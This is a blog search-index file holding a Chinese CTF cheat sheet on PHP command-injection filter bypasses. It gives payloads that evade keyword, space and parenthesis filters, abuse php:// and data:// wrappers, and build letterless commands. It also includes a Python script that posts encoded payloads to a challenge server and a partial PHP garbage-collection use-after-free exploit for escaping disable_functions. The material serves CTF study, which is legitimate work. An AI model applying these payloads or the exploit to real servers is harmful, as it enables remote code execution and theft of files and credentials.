<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>命令执行</title>
      <link href="/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>首先看过滤了什么东西，再按照下面的方法一点一点绕过。<br>再利用没过滤的字符构造playload<br>很多是可以泛用的，如果能找到一个很好用的也不错。</p><p>前置知识</p><pre><code>&lt;?=`ls /`;?&gt;等效于&lt;?php echo `ls /`; ?&gt;?cmd=?&gt;&lt;?=`ls \`;闭合第一个php，然后构造第二个短标签形式的phpphp文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方PHP的一些标签有&lt;?...?&gt;&lt;%...%&gt;&lt;?php ...?&gt;&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code></pre><p>各种绕过手法</p><pre><code>【过滤变量名】重构变量?c=system($_GET[&#39;a&#39;]);&amp;a=cat flag.php;匹配符绕过?c=echo `cat fl&#39;&#39;ag.php`;?c=echo `cat fl/ag.txt`;?c=echo `cat fl*`;php里反引号相当于system执行系统命令两个引号分割是shell特性，执行时会自动忽略【过滤system】system()assert()passthru()exec()           //只执行无回显shell_exec()     // 只执行无回显popen()          // 不会直接返回执行结果，而是返回一个文件指针popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; );proc_open()      //不会直接返回执行结果，而是返回一个文件指针pcntl_exec()call_user_func()还可以写马，也可以tac /fl\ag |tee 1.txt 将返回的内容写入1.txt【过滤cat】more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容sh /flag 2&gt;%261  //报错出文件内容strings:可以查看rev:反过来看新增一个xxd可以读取文件curl file:///flag 也行bash -v:/etc/passwddate -f:好像可以越权读取文件/bin/cat:/bin/是cat的目录，意思是执行/bin/cat文件,再用?cat代替cat【过滤空格】&lt;&lt;&gt;%09%20$IFS$&#123;IFS&#125;$IFS$9$IFS$1顺便提一句，%09表示的是制表符，是shell里的空格，而不是php的空格因为浏览器会自动对特殊字符进行编码所以使用%09表示制表符也是可以被浏览器正确识别的【过滤;】使用?&gt;替换，因为最后一句不用分号include，也就是说应该传入一个文件名include的文件中出错了但是主程序会继续往下执行【过滤括号】使用不用括号的函数(伪协议)?c=php://filter/read=convert.base64-encode/resource=flag.php伪协议也可以重构变量?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.txt【PHP伪协议】file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流【文件按包含漏洞】使用data://协议执行PHP代码?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;     显示文件源码?c=data://text/plain,&lt;?=system(&#39;tac fl&quot;&quot;ag.php&#39;);?&gt;      查看日志此处让网页直接包含我们写入的代码，从而执行恶意命令但是仍然要绕过对flag的过滤【常用套娃函数】session_id()：用来获取/设置当前会话 ID，可以获取phpsessionid，并且值是可控的getallheaders()：返回所有的HTTP头信息get_defined_vars() 返回一个包含所有已定义变量列表的多维数组array_pop() 是删除并返回数组最后一个元素current() 返回数组中的当前元素的值。别名是pos()next() 返回数组中的下一个元素的值。end()最后一个prev() 将数组中的内部指针倒回一位each() 返回数组中当前的键/值对并将数组指针向前移动一步scandir() 函数返回指定目录中的文件和目录的数组。print_r() 函数用于打印变量，以更容易理解的形式展示。localeconv()函数会返回一一个包含本地数字及货币格式信息的数组（其实就是.）current() 函数返回数组中的当前元素的值。别名是pos()array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。read_file()  读出源码highlight_file()  读出源码show_source()  读出源码include()  读出源码file_get_contents()  读出源码还能先include(&quot;文件&quot;)再echo $变量;还能先require(&quot;文件&quot;)再echo $变量;还能先include(&quot;文件&quot;);再var_dump(get_defined_vars());【套娃例子】要使用POST传参时:?c=eval(array_pop(next(get_defined_vars())));cmd=system(“cat flag.php”);不使用POST传参时:?c=show_source(next(array_reverse(scandir(pos(localeconv())))));在COOKIE处传马时:/?c=show_source(session_id(session_start()));再把PHPSSID值设为flag.php只使用POST传参时:c=print_r(scandir(&#39;.&#39;));【重定向绕过】0   标准输入1   标准输出2   错误输出/dev/null(空设备)丢弃一切写入其中的数据(但报告写入操作成功)区别：   2&gt;/dev/null   把错误输出到空设备（即丢弃）   2&gt;&amp;1 &gt;/dev/null   错误输出到屏幕上，而标准输出被丢弃   &gt;/dev/null 2&gt;&amp;1   相当于1&gt;/dev/null 2&gt;&amp;1错误和标准输出都输出到空设备重定向&gt;和&gt;&gt;：   前者会先清空文件再写入内容，后者会将重定向的内容追加到现有文件的尾部使用;  &amp;&amp;  %0a  ||等等绕过即可因为过滤代码只将最后一个命令输出到null，使用;或运算符分隔就行但是要注意所用的PHP版本会影响效果，多试试。【无字母数字的命令执行】/bin/base64以base64加密输出文件所以payload: /?c=/???/????64 ????.???或者/usr/bin/bzip2将文件压缩为文件名.bz2然后访问payload: /?c=/???/???/????2 ????.???【文件上传形式的命令执行】原理是通过POST上传一个文件，文件内容是要执行的命令使用点命令执行该文件时形成条件竞争这个文件默认保存在/tmp/phpxxxx路径下，所以可以通过/???/????????[@-[]来构成这个路径[@-[]为匹配ascii码范围在@-[的字符（A，Z被屏蔽，所以范围大一位）之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。POST的参数为?c=.%20/???/????????[@-[]上传下面的内容可以达到命令执行的效果#!  /bin/bashls【数学整数计算】$(())表示运算符计算，且默认相加，~是取反的意思$(())能进行的运算有 + - * / % &amp; | ^ ! AND OR XOR NOT    $(()) = 0    ~$(()) = -0    $((~$(()))) = -1    $((~$(()))) = -1    ~$((~$(()))) = 1    echo $((a+b*c)) = 19    $(($((~ $(()))) $((~ $(()))) $((~ $(()))))) = -3【命令执行后继续对回显操作】（1）使用exit();直接退出。（2）使用POST方法查找目录(post参数可以直接被执行的时候)c=$a=&quot;glob:// /*.txt&quot;;  if ($b = opendir($a)) &#123;    while(($file = readdir($b))) !== false) &#123;      echo&quot;filename:&quot;.$file.&quot;\n&quot;;    &#125;    closedir($b);  &#125;exit(0);（3）在POST传参获取mysql数据c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=数据库名&#39;, &#39;账号&#39;,&#39;密码&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;文件名&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);（4）用POST方法重定向文件内容输出到其他地方c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/要读的文件&gt;存到那个文件&quot;);exit();【使用bash内置变量构造RCE】因为一般题目都在/var/www/html下经过多次尝试，最后能构造出nl在加上通配符？匹配文件$&#123;HOME:~0&#125;$&#123;PATH:~0&#125;$&#123;PWD:~A&#125;$&#123;USER:~A&#125;</code></pre><h5 id="上面提到的一些小脚本或快捷命令"><a href="#上面提到的一些小脚本或快捷命令" class="headerlink" title="上面提到的一些小脚本或快捷命令"></a>上面提到的一些小脚本或快捷命令</h5><p>下面是通过或运算构造字符（无字母数字命令执行）<br>通过一些字符互相运算后构造得到我们的payload<br>当异或自增和取反构造字符都无法使用，但是可以用|<br>要求使用POST方式传参，且传入的参数可以直接执行时<br>但是注意尽量使用Python发包，hackbar和BP有时候不是很好用。</p><pre class="line-numbers language-Python"><code class="language-Python">import reimport urllibimport requestsfrom urllib import parse hex_i = "" hex_j = "" pattern='/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&|\-/i'# str1=["system","cat flag.php"]# for p in range(2):     t1 = ""     t2 = ""     for k in str1[p]:         for i in range(256):             for j in range(256):                 if re.search(pattern,chr(i)) :                     break                 if re.search(pattern,chr(j)) :                     continue                 if i < 16:                     hex_i = "0" + hex(i)[2:]                 else:                     hex_i=hex(i)[2:]                 if j < 16:                     hex_j="0"+hex(j)[2:]                 else:                     hex_j=hex(j)[2:]                 hex_i='%'+hex_i                 hex_j='%'+hex_j                 c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))                 if(c ==k):                     t1=t1+hex_i                     t2=t2+hex_j                     break             else:                 continue             break     payload = "(\""+t1+"\"|\""+t2+"\")"     print(payload)payload='("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%03%01%14%00%06%0c%01%07%00%10%08%10"|"%60%60%60%20%60%60%60%60%2e%60%60%60")'print(payload)data=&#123;    "c":urllib.parse.unquote(payload)&#125;url="http://9fdf5bf0-5dfe-4203-ae04-41501a9f6768.challenge.ctf.show/"re=requests.post(url,data=data)print(re.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面是文件上传的页面</p><pre class="line-numbers language-HTML"><code class="language-HTML"><!DOCTYPE html><html><body><form action="http://40ebaa4e-8bb9-4a0d-ba18-623eea11822d.challenge.ctf.show/" method="POST" enctype="multipart/form-data"><input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="2333" /><input type="file" name="file" /><input type="submit" value="submit" /></form></body></html><?phpsession_start();?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用PHP垃圾回收漏洞显示出文件内容POC，记得编码</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Vuln</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>            <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>             <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">class</span> <span class="token class-name">Helper</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$address</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &amp;#125;</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &amp;#123; </span>                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else continue;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else continue;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token 